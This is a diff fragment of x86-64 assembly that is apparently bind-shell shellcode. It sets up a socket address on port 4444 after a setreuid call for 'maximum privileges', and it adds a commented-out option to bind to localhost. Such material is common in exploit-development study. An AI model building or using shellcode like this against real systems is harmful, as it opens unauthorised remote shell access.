@@ -33,6 +33,7 @@ setreuid: ; set real and user id for maximum privileges
 sock_addr:
   xor r8, r8                  ; clear the value of r8
   push r8                     ; push r8 to the stack as it's null (INADDR_ANY = 0)
+;  push 0x0100007f             ; localhost ip, 127.0.0.1  if you want to fix the ip to localhost
   push WORD 0x5C11            ; push our port number to the stack (Port = 4444)
   push WORD 2                 ; push protocol argument to the stack (AF_INET = 2)
   mov r13, rsp                ; Save the sock_addr_in into r13
